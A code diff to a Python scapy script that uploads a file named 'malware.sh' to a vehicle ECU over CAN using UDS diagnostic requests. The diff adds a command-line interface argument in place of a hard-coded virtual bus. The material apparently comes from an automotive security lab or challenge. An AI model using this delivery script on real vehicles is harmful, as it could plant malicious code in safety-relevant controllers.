@@ -1,7 +1,7 @@
 from scapy.sendrecv import sniff
 from scapy.main import load_contrib
 from scapy.layers.can import *
-import json, base64
+import json, base64, sys
 
 conf.contribs['ISOTP'] = {'use-can-isotp-kernel-module': True}
 conf.contribs['CANSocket'] = {'use-python-can': False}
@@ -10,6 +10,13 @@ load_contrib('cansocket')
 load_contrib('isotp')
 load_contrib('automotive.uds')
 load_contrib('automotive.ecu')
+
+if len(sys.argv) < 2:
+    iface = "vcan0"
+else:
+    iface = sys.argv[1]
+
+sock = ISOTPSocket(iface, sid=0x601, did=0x701, basecls=UDS)
 
 with open("malware.sh", "rb") as fw:
     data = fw.read()
@@ -25,8 +32,6 @@ requests = [ \
     UDS()/UDS_RTE(transferRequestParameterRecord=b'done'), \
     UDS()/UDS_ER()
 ]
-
-sock = ISOTPSocket('vcan0', sid=0x601, did=0x701, basecls=UDS)
 
 for req in requests:
     resp = sock.sr1(req, timeout=1, verbose=False)
